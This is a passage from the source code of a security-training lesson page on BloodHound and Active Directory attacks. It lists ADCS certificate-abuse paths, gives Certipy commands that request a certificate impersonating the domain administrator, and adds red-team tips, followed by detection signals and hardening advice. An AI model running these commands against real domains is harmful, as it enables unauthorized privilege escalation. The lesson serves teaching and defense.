                <li><b>ADCSESC1</b>: template allows SAN spoofing → cert as any user.</li>
                <li><b>ADCSESC3</b>: enrollment-agent template → request a cert on behalf of DA.</li>
                <li><b>ADCSESC4</b>: vulnerable ACL on a template.</li>
                <li><b>ADCSESC6</b>: EDITF_ATTRIBUTESUBJECTALTNAME2 set on the CA.</li>
                <li><b>ADCSESC7-9</b>: NTLM relay → CA endpoints.</li>
                <li><b>ADCSESC13</b>: OID group-link abuse.</li>
              </ul>
              <Code lang="bash">{`# Exploitation after detection:
# Certipy (the unified tool)
certipy find -u user@corp.local -p Pass! -dc-ip 10.0.0.1 -vulnerable
certipy req -u user@corp.local -p Pass! -ca CORP-CA \\
  -template VulnTemplate -upn administrator@corp.local
# Result: cert authenticates as administrator → DA`}</Code>
            </Section>

            <Section title="Pro tips real red teams use">
              <ol className="list-decimal ps-6 space-y-2 opacity-90">
                <li><b>Collect data before you need it</b>: SharpHound at engagement start, even before you know what you'll do with it.</li>
                <li><b>Import on a fresh instance</b>: don't mix client data. Docker per engagement.</li>
                <li><b>Click a node → "Set as Starting Node"</b> + "Set as Ending Node" → "Pathfinding".</li>
                <li><b>Mark sensitive systems "High Value"</b> (file servers, Exchange, PKI, Tier-0). Pathfinding prefers them.</li>
                <li><b>Use the Analysis tab</b> — fan-out / fan-in counts surface AD bottlenecks.</li>
                <li><b>Custom queries.json</b>: save your own Cypher for use across engagements.</li>
                <li><b>Track "Outbound Object Control"</b> for every user you compromise — what can they touch?</li>
                <li><b>BloodHound + ldapdomaindump</b>: complementary; ldapdomaindump is faster for text summaries.</li>
                <li><b>Don't forget trusts</b>: often ignored, but a child-domain trust = forest pivot.</li>
                <li><b>Before every move, ask Cypher for the shortest path.</b> Don't move blind. Every group you join = noise.</li>
              </ol>
            </Section>

            <Section title="Defender side — how do you get caught?">
              <Callout kind="warn" title="SharpHound execution signals">
                <ul className="list-disc ps-6 space-y-1">
                  <li>Massive LDAP queries from a single host in a short window.</li>
                  <li>SMB sessions to every host in the domain (lateral session enumeration).</li>
                  <li>Microsoft Defender for Identity alerts on "Reconnaissance using directory services queries".</li>
                  <li>Honey objects: a fake account with an enticing SPN — if it gets Kerberoasted, that's an attacker.</li>
                  <li>Unusual ACL changes, especially on gMSA and LAPS-readable groups.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="Defense — engineer AD that BloodHound can't pwn">
              <Callout kind="good" title="Practical defensive reference">
                <ol className="list-decimal ps-6 space-y-2">
                  <li><b>Strict tier model</b>: Tier-0 (DC, ADCS, Entra Connect), Tier-1 (servers), Tier-2 (workstations). No cross-tier login.</li>
                  <li><b>LAPS for every local admin</b>: each host has a unique, rotating password.</li>
                  <li><b>Kerberoast hardening</b>: gMSA for every service account, disable RC4, AES only.</li>
                  <li><b>ADCS hardening</b>: review every template, disable SAN in user templates, EDITF_ATTRIBUTESUBJECTALTNAME2 off.</li>
                  <li><b>Constrained delegation only</b> — no Unconstrained on any host.</li>
                  <li><b>Alert on ACL changes to valuable objects</b> — instant notification.</li>
                  <li><b>Privileged Access Workstations (PAW)</b> for Tier-0 admins.</li>
                  <li><b>Run BloodHound on yourself periodically</b> — know the paths before the attacker does.</li>
                  <li><b>Microsoft Defender for Identity (paid)</b> — catches most BloodHound techniques + Kerberoast + DCSync.</li>
                </ol>
              </Callout>
            </Section>

            <Section title="Mastery resources">
              <ul className="list-disc ps-6 space-y-1 opacity-90">
                <li><b>BloodHound docs</b>: bloodhound.specterops.io — official and current.</li>
                <li><b>SpecterOps blog</b>: deep posts from the maintainers.</li>
                <li><b>HTB Pro Labs (Dante, Offshore, RastaLabs)</b>: realistic AD environments.</li>
                <li><b>GOAD (Game of Active Directory)</b>: free Vagrant-based lab.</li>
                <li><b>SANS SEC560/SEC565</b>: pro training tracks.</li>
                <li><b>The Hacker Playbook 3</b> + <b>Pentesting Active Directory by SpecterOps</b>.</li>
              </ul>
            </Section>
          </>
        }
      />
    </LessonShell>
  );
}
